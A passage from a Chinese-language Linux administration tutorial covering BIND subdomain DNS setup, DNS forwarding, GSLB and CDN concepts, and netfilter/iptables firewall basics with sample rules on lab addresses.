title="（2）实现子域的DNS服务器"></a>（2）实现子域的DNS服务器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@104 ~]<span class="hljs-comment"># yum install bind -y</span><br><br>[root@104 ~]<span class="hljs-comment"># vim /etc/named.conf             </span><br><span class="hljs-comment">#注释掉下面两行</span><br>// listen-on port 53 &#123; 127.0.0.1; &#125;;<br>// allow-query     &#123; localhost; &#125;;<br>allow-transfer &#123; none;&#125;; <br><br>[root@104 ~]<span class="hljs-comment"># vim /etc/named.rfc1912.zones</span><br>zone <span class="hljs-string">&quot;shanghai.willoneday.org&quot;</span> &#123;<br>       <span class="hljs-built_in">type</span> master;<br>       file <span class="hljs-string">&quot;shanghai.willoneday.org.zone&quot;</span>;<br>&#125;;<br><br>[root@104 ~]<span class="hljs-comment"># cp -p /var/named/named.localhost /var/named/shanghai.willoneday.org.zone</span><br><span class="hljs-comment">#如果没有-p，需要改权限。chgrp named willoneday.org.zone</span><br>[root@104 ~]<span class="hljs-comment"># vim /var/named/shanghai.willoneday.org.zone </span><br><span class="hljs-variable">$TTL</span> 1D<br>@       IN SOA  master admin.willoneday.org. (<br>                                        4       ; serial<br>                                        1D      ; refresh<br>                                        1H      ; retry<br>                                        1W      ; expire<br>                                        3H )    ; minimum<br>                NS      master<br>master          A       10.0.0.101<br>www             A       10.0.0.102                <br><br>[root@104 ~]<span class="hljs-comment"># systemctl start named   #第一次启动服务</span><br>[root@104 ~]<span class="hljs-comment"># rndc reload             #不是第一次启动服务</span><br></code></pre></td></tr></table></figure><h4 id="（3）在父域和子域的web服务器上安装httpd服务"><a href="#（3）在父域和子域的web服务器上安装httpd服务" class="headerlink" title="（3）在父域和子域的web服务器上安装httpd服务"></a>（3）在父域和子域的web服务器上安装httpd服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#父域的web服务器利用上面案例（略）</span><br><span class="hljs-comment">#在子域的web服务器上安装http服务</span><br>yum install httpd                        <br><span class="hljs-comment">#配置主页面</span><br><span class="hljs-built_in">echo</span> www.shanghai.willoneday.org &gt; /var/www/html/index.html<br><span class="hljs-comment">#启动服务</span><br>systemctl start httpd<br></code></pre></td></tr></table></figure><h4 id="（4）客户端测试"><a href="#（4）客户端测试" class="headerlink" title="（4）客户端测试"></a>（4）客户端测试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig www.shanghai.willoneday.org<br></code></pre></td></tr></table></figure><hr><h2 id="8-实现-DNS-转发（缓存）服务器"><a href="#8-实现-DNS-转发（缓存）服务器" class="headerlink" title="8 实现 DNS 转发（缓存）服务器"></a>8 实现 DNS 转发（缓存）服务器</h2><h3 id="8-1-DNS转发"><a href="#8-1-DNS转发" class="headerlink" title="8.1 DNS转发"></a>8.1 DNS转发</h3><blockquote><p>利用DNS转发，可以将用户的DNS请求，转发至指定的DNS服务，而非默认的根DNS服务器，并将指定服务器查询的返回结果进行缓存，提高效率</p><p>注意：</p><ol><li>被转发的服务器需要能够为请求者做递归，否则转发请求不予进行</li><li>在/etc/named.conf的全局配置块中，关闭dnssec功能</li></ol></blockquote><h3 id="8-2-转发方式"><a href="#8-2-转发方式" class="headerlink" title="8.2 转发方式"></a>8.2 转发方式</h3><h4 id="8-2-1-全局转发"><a href="#8-2-1-全局转发" class="headerlink" title="8.2.1 全局转发"></a>8.2.1 全局转发</h4><p>对非本机所负责解析区域的请求，全转发给指定的服务器</p><p>在全局配置块中实现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Options &#123;<br>       forward first|only;<br>       forwarders &#123; ip;&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="8-2-2-特定区域转发"><a href="#8-2-2-特定区域转发" class="headerlink" title="8.2.2 特定区域转发"></a>8.2.2 特定区域转发</h4><p>仅转发对特定的区域的请求，比全局转发优先级高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">zone <span class="hljs-string">&quot;ZONE_NAME&quot;</span> IN &#123;<br>     <span class="hljs-built_in">type</span> forward;<br>     forward first|only;<br>     forwarders &#123; ip;&#125;;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p><strong>first：先转发至指定DNS服务器，如果无法解析查询请求，则本服务器再去根服务器查询</strong></p><p><strong>only: 先转发至指定DNS服务器，如果无法解析查询请求，则本服务器将不再去根服务器查询</strong></p></blockquote><h3 id="8-3-实战案例：实现DNS-forward（缓存）服务器"><a href="#8-3-实战案例：实现DNS-forward（缓存）服务器" class="headerlink" title="8.3 实战案例：实现DNS forward（缓存）服务器"></a>8.3 实战案例：实现DNS forward（缓存）服务器</h3><hr><h2 id="9-实现智能-DNS"><a href="#9-实现智能-DNS" class="headerlink" title="9 实现智能 DNS"></a>9 实现智能 DNS</h2><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021150311248-725218953.png"><img src="2927659-20221021150311248-725218953.png" alt="img"></a></p><h3 id="9-1-GSLB"><a href="#9-1-GSLB" class="headerlink" title="9.1 GSLB"></a>9.1 GSLB</h3><blockquote><p>GSLB：Global Server Load Balance全局负载均衡</p><p>GSLB 是对服务器和链路进行综合判断来决定由哪个地点的服务器来提供服务，实现异地服务器群服务质量的保证</p><p>GSLB主要的目的是在整个网络范围内将用户的请求定向到最近的节点（或者区域）</p><p>GSLB分为基于DNS实现、基于重定向实现、基于路由协议实现，其中最通用的是基于DNS解析方式</p></blockquote><h3 id="9-2-CDN-内容分发网络"><a href="#9-2-CDN-内容分发网络" class="headerlink" title="9.2 CDN 内容分发网络"></a>9.2 CDN 内容分发网络</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021150501836-1587744129.png"><img src="2927659-20221021150501836-1587744129.png" alt="img"></a></p><h4 id="9-2-1-CDN工作原理"><a href="#9-2-1-CDN工作原理" class="headerlink" title="9.2.1 CDN工作原理"></a>9.2.1 CDN工作原理</h4><blockquote><ol><li>用户向浏览器输入<a href="http://www.a.com这个域名,浏览器第一次发现本地没有dns缓存,则向网站的dns服务器请求/">www.a.com这个域名，浏览器第一次发现本地没有dns缓存，则向网站的DNS服务器请求</a></li><li>网站的DNS域名解析器设置了CNAME，指向了<a href="http://www.a.tbcdn.com,请求指向了cdn网络中的智能dns负载均衡系统/">www.a.tbcdn.com,请求指向了CDN网络中的智能DNS负载均衡系统</a></li><li>智能DNS负载均衡系统解析域名，把对用户响应速度最快的IP节点返回给用户；</li><li>用户向该IP节点（CDN服务器）发出请求</li><li>由于是第一次访问，CDN服务器会通过Cache内部专用DNS解析得到此域名的原web站点IP，向原站点服务器发起请求，并在CDN服务器上缓存内容</li><li>请求结果发给用户</li></ol></blockquote><h3 id="9-3-智能DNS相关技术"><a href="#9-3-智能DNS相关技术" class="headerlink" title="9.3 智能DNS相关技术"></a>9.3 智能DNS相关技术</h3><hr><h2 id="10-综合实战案例：实现-Internet-的-DNS-服务架构"><a href="#10-综合实战案例：实现-Internet-的-DNS-服务架构" class="headerlink" title="10 综合实战案例：实现 Internet 的 DNS 服务架构"></a>10 综合实战案例：实现 Internet 的 DNS 服务架构</h2><h1 id="-5"><a href="#-5" class="headerlink" title=""></a></h1><hr><h1 id="二、Linux-防火墙"><a href="#二、Linux-防火墙" class="headerlink" title="二、Linux 防火墙"></a>二、Linux 防火墙</h1><h2 id="1-安全技术和防火墙"><a href="#1-安全技术和防火墙" class="headerlink" title="1 安全技术和防火墙"></a>1 安全技术和防火墙</h2><h3 id="1-1-安全技术"><a href="#1-1-安全技术" class="headerlink" title="1.1 安全技术"></a>1.1 安全技术</h3><blockquote><ul><li>入侵检测系统（Intrusion Detection Systems）</li></ul><p>特点是不阻断任何网络访问，量化、定位来自内外网络的威胁情况，主要以提供报警和事后监督为主，提供有针对性的指导措施和安全决策依据,类似于监控系统一般采用旁路部署方式</p><ul><li>入侵防御系统（Intrusion Prevention System）</li></ul><p>以透明模式工作，分析数据包的内容如：溢出攻击、拒绝服务攻击、木马、蠕虫、系统漏洞等进行准确的分析判断，在判定为攻击行为后立即予以阻断，主动而有效的保护网络的安全，一般采用在线部署方式</p><ul><li>防火墙（ FireWall ）</li></ul><p>隔离功能，工作在网络或主机边缘，对进出网络或主机的数据包基于一定的规则检查，并在匹配某规则时由规则定义的行为进行处理的一组功能的组件，基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略,会将希望外网访问的主机放在DMZ(demilitarized zone)网络中.</p></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021145014684-1868779511.png"><img src="2927659-20221021145014684-1868779511.png" alt="img"></a></p><h3 id="1-2-防火墙的分类"><a href="#1-2-防火墙的分类" class="headerlink" title="1.2 防火墙的分类"></a>1.2 防火墙的分类</h3><blockquote><p>按保护范围划分：</p><ul><li>主机防火墙：服务范围为当前一台主机</li><li>网络防火墙：服务范围为防火墙一侧的局域网</li></ul><p>按实现方式划分:</p><ul><li>硬件防火墙：在专用硬件级别实现部分功能的防火墙；另一个部分功能基于软件实现，如：华为，山石hillstone,天融信，启明星辰，绿盟，深信服, PaloAlto , fortinet飞塔, Cisco, Checkpoint，NetScreen(2004年被 Juniper 用40亿美元收购)等</li><li>软件防火墙：运行于通用硬件平台之上的防火墙的应用软件，Windows 防火墙 ISA –&gt; ForefrontTMG</li></ul><p>按网络协议划分：</p><ul><li>网络层防火墙：OSI模型下四层，又称为包过滤防火墙</li><li>应用层防火墙/代理服务器：proxy 代理网关，OSI模型七层</li></ul></blockquote><hr><h2 id="2-Linux-防火墙的基本认识"><a href="#2-Linux-防火墙的基本认识" class="headerlink" title="2 Linux 防火墙的基本认识"></a>2 Linux 防火墙的基本认识</h2><h3 id="2-1-Netfilter"><a href="#2-1-Netfilter" class="headerlink" title="2.1 Netfilter"></a>2.1 Netfilter</h3><blockquote><p>Linux防火墙是由Netfilter组件提供的，Netfilter工作在内核空间，集成在linux内核中</p><p>Netfilter 是Linux 2.4.x之后新一代的Linux防火墙机制，是linux内核的一个子系统。Netfilter采用模块化设计，具有良好的可扩充性，提供扩展各种网络服务的结构化底层框架。Netfilter与IP协议栈是无缝契合，并允许对数据报进行过滤、地址转换、处理等操作</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># grep -m 10 NETFILTER /boot/config-4.18.0-372.9.1.el8.x86_64</span><br>CONFIG_NETFILTER=y<br>CONFIG_NETFILTER_ADVANCED=y<br>CONFIG_BRIDGE_NETFILTER=m<br>CONFIG_NETFILTER_INGRESS=y<br>CONFIG_NETFILTER_NETLINK=m<br>CONFIG_NETFILTER_FAMILY_BRIDGE=y<br>CONFIG_NETFILTER_FAMILY_ARP=y<br><span class="hljs-comment"># CONFIG_NETFILTER_NETLINK_ACCT is not set</span><br>CONFIG_NETFILTER_NETLINK_QUEUE=m<br>CONFIG_NETFILTER_NETLINK_LOG=m<br><br><span class="hljs-comment">#y表示集成在内核中</span><br>[root@rocky01 ~]<span class="hljs-comment"># ll /boot/vmlinuz-4.18.0-372.9.1.el8.x86_64</span><br><br><span class="hljs-comment">#m表示在模块中</span><br>[root@rocky01 ~]<span class="hljs-comment"># ll /lib/modules/4.18.0-372.9.1.el8.x86_64/</span><br>[root@rocky01 ~]<span class="hljs-comment"># modinfo bridge</span><br></code></pre></td></tr></table></figure><h3 id="2-2-防火墙工具介绍"><a href="#2-2-防火墙工具介绍" class="headerlink" title="2.2 防火墙工具介绍"></a>2.2 防火墙工具介绍</h3><h4 id="2-2-1-iptables"><a href="#2-2-1-iptables" class="headerlink" title="2.2.1 iptables"></a>2.2.1 iptables</h4><blockquote><p>由软件包iptables提供的命令行工具，工作在用户空间，用来编写规则，写好的规则被送往netfilter，告诉内核如何去处理信息包</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># ll `which iptables`</span><br>lrwxrwxrwx. 1 root root 17 Apr 20  2022 /usr/sbin/iptables -&gt; xtables-nft-multi<br></code></pre></td></tr></table></figure><h5 id="范例：安装iptables的service包"><a href="#范例：安装iptables的service包" class="headerlink" title="范例：安装iptables的service包"></a>范例：安装iptables的service包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># dnf -y install iptables-services</span><br></code></pre></td></tr></table></figure><h4 id="2-2-2-firewalld"><a href="#2-2-2-firewalld" class="headerlink" title="2.2.2 firewalld"></a>2.2.2 firewalld</h4><blockquote><p>从CentOS 7 版开始引入了新的前端管理工具，到Centos8取消</p><p>软件包：</p><ul><li>firewalld</li><li>firewalld-config</li></ul><p>管理工具：</p><ul><li>firewall-cmd 命令行工具</li><li>firewall-config 图形工作</li></ul></blockquote><h4 id="2-2-3-nftables"><a href="#2-2-3-nftables" class="headerlink" title="2.2.3 nftables"></a>2.2.3 nftables</h4><blockquote><p>此软件是CentOS 8 新特性,Nftables最初在法国巴黎的Netfilter Workshop 2008上发表，然后由长期的netfilter核心团队成员和项目负责人Patrick McHardy于2009年3月发布。</p></blockquote><h4 id="范例：CentOS-8-支持三种防火墙服务"><a href="#范例：CentOS-8-支持三种防火墙服务" class="headerlink" title="范例：CentOS 8 支持三种防火墙服务"></a>范例：CentOS 8 支持三种防火墙服务</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl status iptables</span><br>● iptables.service - IPv4 firewall with iptables<br>   Loaded: loaded (/usr/lib/systemd/system/iptables.service; disabled; vendor preset: disabled)<br>   Active: inactive (dead)<br><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl status firewalld</span><br>● firewalld.service - firewalld - dynamic firewall daemon<br>   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)<br>   Active: inactive (dead)<br>     Docs: man:firewalld(1)<br><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl status nftables</span><br>● nftables.service - Netfilter Tables<br>   Loaded: loaded (/usr/lib/systemd/system/nftables.service; disabled; vendor preset: disabled)<br>   Active: inactive (dead)<br>     Docs: man:nft(8)<br></code></pre></td></tr></table></figure><hr><h3 id="2-3-netfilter-中五个勾子函数和报文流向"><a href="#2-3-netfilter-中五个勾子函数和报文流向" class="headerlink" title="2.3 netfilter 中五个勾子函数和报文流向"></a>2.3 netfilter 中五个勾子函数和报文流向</h3><blockquote><p>Netfilter在内核中选取五个位置放了五个hook(勾子) function(INPUT、OUTPUT、FORWARD、PREROUTING、POSTROUTING)，而这五个hook function向用户开放，用户可以通过一个命令工具（iptables）向其写入规则</p><p>由信息过滤表（table）组成，包含控制IP包处理的规则集（rules），规则被分组放在链（chain）上</p></blockquote><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021155826630-240959642.png"><img src="2927659-20221021155826630-240959642.png" alt="img"></a></p><hr><h3 id="2-4-iptables的组成"><a href="#2-4-iptables的组成" class="headerlink" title="2.4 iptables的组成"></a>2.4 iptables的组成</h3><p>iptables由五个表table和五个链chain以及一些规则组成</p><blockquote><p><strong>链</strong> <strong>chain****：</strong></p><ul><li>内置链：每个内置链对应于一个钩子函数</li><li>自定义链：用于对内置链进行扩展或补充，可实现更灵活的规则组织管理机制；只有Hook钩子调用自定义链时，才生效</li></ul><p><strong>五个内置链****chain:</strong></p><ul><li><code>INPUT,OUTPUT,FORWARD,PREROUTING,POSTROUTING</code></li></ul><p><strong>五个表<strong><strong>table</strong></strong>：</strong>filter、nat、mangle、raw、security</p><ul><li>filter：过滤规则表，根据预定义的规则过滤符合条件的数据包,默认表</li><li>nat：network address translation 地址转换规则表</li><li>mangle：修改数据标记位规则表</li><li>raw：关闭启用的连接跟踪机制，加快封包穿越防火墙速度</li><li>security：用于强制访问控制（MAC）网络规则，由Linux安全模块（如SELinux）实现</li></ul><p><strong>优先级由高到低的顺序为：</strong></p><p>security –&gt;raw–&gt;mangle–&gt;nat–&gt;filter</p></blockquote><h4 id="范例：查询表和链的对应关系"><a href="#范例：查询表和链的对应关系" class="headerlink" title="范例：查询表和链的对应关系"></a>范例：查询表和链的对应关系</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># iptables -t filter -vnL</span><br>Chain INPUT (policy ACCEPT 0 packets, 0 bytes)<br> pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination<br><br>Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)<br> pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination<br><br>Chain OUTPUT (policy ACCEPT 0 packets, 0 bytes)<br> pkts bytes target     prot opt <span class="hljs-keyword">in</span>     out     <span class="hljs-built_in">source</span>               destination<br><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -t nat -vnL</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -t mangle -vnL</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -t raw -vnL</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -t security -vnL</span><br></code></pre></td></tr></table></figure><hr><h3 id="2-5-netfilter-完整流程"><a href="#2-5-netfilter-完整流程" class="headerlink" title="2.5 netfilter 完整流程"></a>2.5 netfilter 完整流程</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221021162824622-342021938.png"><img src="2927659-20221021162824622-342021938.png" alt="img"></a></p><hr><h2 id="3-iptables"><a href="#3-iptables" class="headerlink" title="3 iptables"></a>3 iptables</h2><h3 id="3-1-iptables-规则说明"><a href="#3-1-iptables-规则说明" class="headerlink" title="3.1 iptables 规则说明"></a>3.1 iptables 规则说明</h3><h4 id="3-1-1-iptables-规则组成"><a href="#3-1-1-iptables-规则组成" class="headerlink" title="3.1.1 iptables 规则组成"></a>3.1.1 iptables 规则组成</h4><blockquote><p>规则rule：根据规则的匹配条件尝试匹配报文，对匹配成功的报文根据规则定义的处理动作作出处理，规则在链接上的次序即为其检查时的生效次序</p><p>匹配条件：默认为与条件，同时满足</p><p>基本匹配：IP，端口，TCP的Flags（SYN,ACK等）</p><p>扩展匹配：通过复杂高级功能匹配</p><p>处理动作：称为target，跳转目标</p><ul><li>内建处理动作：ACCEPT,DROP,REJECT,SNAT,DNAT,MASQUERADE,MARK,LOG…</li><li>自定义处理动作：自定义chain，利用分类管理复杂情形</li></ul><p>规则要添加在链上，才生效；添加在自定义链上不会自动生效</p><p>白名单:只有指定的特定主机可以访问,其它全拒绝</p><p>黑名单:只有指定的特定主机拒绝访问,其它全允许,默认方式</p></blockquote><h4 id="3-1-2-iptables规则添加时考量点"><a href="#3-1-2-iptables规则添加时考量点" class="headerlink" title="3.1.2 iptables规则添加时考量点"></a>3.1.2 iptables规则添加时考量点</h4><blockquote><ul><li>要实现哪种功能：判断添加在哪张表上</li><li>报文流经的路径：判断添加在哪个链上</li><li>报文的流向：判断源和目的</li><li>匹配规则：业务需要</li></ul></blockquote><h4 id="3-1-3-环境准备"><a href="#3-1-3-环境准备" class="headerlink" title="3.1.3 环境准备"></a>3.1.3 环境准备</h4><blockquote><p><strong>systemctl stop firewalld.service</strong></p><p><strong>只是不使用系统的防火墙规则，并不是真正的关闭了firewalld</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#CentOS 7，8：</span><br>systemctl stop firewalld.service <br>systemctl <span class="hljs-built_in">disable</span> firewalld. service<br><span class="hljs-comment">#或者</span><br>systemctl <span class="hljs-built_in">disable</span> --now firewalld. service<br><br><span class="hljs-comment">#CentOS 6：</span><br>service iptables stop<br>chkconfig iptables off<br></code></pre></td></tr></table></figure><h3 id="3-2-iptables-用法说明"><a href="#3-2-iptables-用法说明" class="headerlink" title="3.2 iptables 用法说明"></a>3.2 iptables 用法说明</h3><p>格式：<code>iptables [-t table] &#123;-A|-C|-D&#125; chain rule-specification</code></p><blockquote><p>命令详解：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">iptables  <span class="hljs-comment">[-t table]</span>  SUBCOMMAND  chain  <span class="hljs-comment">[-m matchname <span class="hljs-comment">[per-match-options]</span>]</span> -j targetname <span class="hljs-comment">[per-target-options]</span><br></code></pre></td></tr></table></figure><p><strong>1**<strong>、</strong></strong>-t table**<strong>：指定表</strong></p><p>security,raw, mangle, nat, [filter]默认</p><p><strong>2<strong><strong>、</strong></strong>SUBCOMMAND****：子命令</strong></p><p><strong>链管理类</strong></p><ul><li>-N：new, 自定义一条新的规则链</li><li>-E：重命名自定义链；引用计数不为0的自定义链不能够被重命名，也不能被删除</li><li>-X：delete，删除自定义的空的规则链</li><li>-P：Policy，设置默认策略；对filter表中的链而言，其默认策略有：ACCEPT：接受, DROP：丢弃</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -N web</span><br><span class="hljs-comment">#改名</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -E web WEB</span><br><span class="hljs-comment">#添加规则</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A WEB -p tcp -m multiport --dports 80,443 -j ACCEPT</span><br><span class="hljs-comment">#删除</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -X WEB</span><br></code></pre></td></tr></table></figure><p><strong>查看类</strong></p><ul><li><strong>-L：list, 列出指定鏈上的所有规则，本选项须置后</strong></li><li><strong>-n：numberic，以数字格式显示地址和端口号</strong></li><li><strong>-v：verbose，详细信息</strong></li><li>-vv 更详细</li><li>-x：exactly，显示计数器结果的精确值,而非单位转换后的易读值</li><li><strong>–line-numbers：显示规则的序号</strong></li><li>-S selected,以iptables-save 命令格式显示链上规则</li></ul><p><strong>常用组合</strong></p><ul><li><strong>-vnL</strong></li><li><strong>-vvnxL –line-numbers</strong></li></ul><p><strong>规则管理类：</strong></p><ul><li><strong>-A：append，追加</strong></li><li><strong>-I：insert, 插入，要指明插入至的规则编号，默认为第一条</strong></li><li><strong>-D：delete，删除 (1) 指明规则序号 (2) 指明规则本身</strong></li><li>-R：replace，替换指定链上的指定规则编号</li><li>-F：flush，清空指定的规则链</li><li>-Z：zero，置零</li><li> iptables的每条规则都有两个计数器(1) 匹配到的报文的个数(2) 匹配到的所有报文的大小之和</li></ul></blockquote><h4 id="范例：Filter表中INPUT规则"><a href="#范例：Filter表中INPUT规则" class="headerlink" title="范例：Filter表中INPUT规则"></a>范例：Filter表中INPUT规则</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#一、丢弃从10.0.0.101发送过来的包</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.101 -j DROP</span><br><span class="hljs-comment">#二、拒绝从10.0.0.101发送过来的包</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.101 -j REJECT</span><br><span class="hljs-comment">#三、拒绝从10.0.0.0/24发送过来的包</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.0/24 -j REJECT</span><br><span class="hljs-comment">#四、插入一条允许10.0.0.1的规则（这里指定了插入在第2条）</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT 2 -s 10.0.0.1 -j ACCEPT</span><br><span class="hljs-comment">#四、删除第2条规则</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -D INPUT 2</span><br><span class="hljs-comment">#五、允许从lo回环网卡发进来的数据</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT -i lo -j ACCEPT</span><br><br><span class="hljs-comment">#查看规则</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -vnL --line-numbers</span><br><span class="hljs-comment">#查看收到的icmp包</span><br>[root@rocky01 ~]<span class="hljs-comment"># tcpdump -i eth0 -nn icmp</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-3-iptables-基本匹配条件"><a href="#3-3-iptables-基本匹配条件" class="headerlink" title="3.3 iptables 基本匹配条件"></a>3.3 iptables 基本匹配条件</h3><p>基本匹配条件：无需加载模块，由iptables/netfilter自行提供</p><blockquote><ul><li>[!] <strong>-s</strong>, –source address[/mask][,…]：源IP地址或者不连续的IP地址</li><li>[!] -d, –destination address[/mask][,…]：目标IP地址或者不连续的IP地址</li><li>[!] <strong>-p</strong>, –protocol protocol：指定协议，可使用数字如0（all）protocol: tcp, udp, icmp, icmpv6, udplite,esp, ah, sctp, mh or“all“  参看：/etc/protocols</li><li>[!] <strong>-i</strong>, –in-interface name：报文流入的接口；只能应用于数据报文流入环节，只应用于INPUT、FORWARD、PREROUTING链</li><li>[!] -o, –out-interface name：报文流出的接口；只能应用于数据报文流出的环节，只应用于FORWARD、OUTPUT、POSTROUTING链</li></ul></blockquote><h4 id="范例：使用方法-3"><a href="#范例：使用方法-3" class="headerlink" title="范例：使用方法"></a>范例：使用方法</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#-s</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -A INPUT -s 10.0.0.6,10.0.0.10 -j REJECT</span><br><br><span class="hljs-comment">#-i</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT -i lo -j ACCEPT</span><br><br><span class="hljs-comment">#-p</span><br>[root@rocky01 ~]<span class="hljs-comment"># iptables -I INPUT 2 -s 10.0.0.6 ! -p icmp -j ACCEPT</span><br></code></pre></td></tr></table></figure><hr><h3 id="3-4-iptables-扩展匹配条件"><a href="#3-4-iptables-扩展匹配条件" class="headerlink" title="3.4 iptables 扩展匹配条件"></a>3.4 iptables 扩展匹配条件</h3><blockquote><p>扩展匹配条件：需要加载扩展模块（/usr/lib64/xtables/*.so），方可生效</p><p>扩展模块的查看帮助 ：man iptables-extensions</p><p>扩展匹配条件：</p><ul><li>隐式扩展</li><li>显式扩展</li></ul></blockquote><h4 id="3-4-1-隐式扩展"><a href="#3-4-1-隐式扩展" class="headerlink" title="3.4.1 隐式扩展"></a>3.4.1 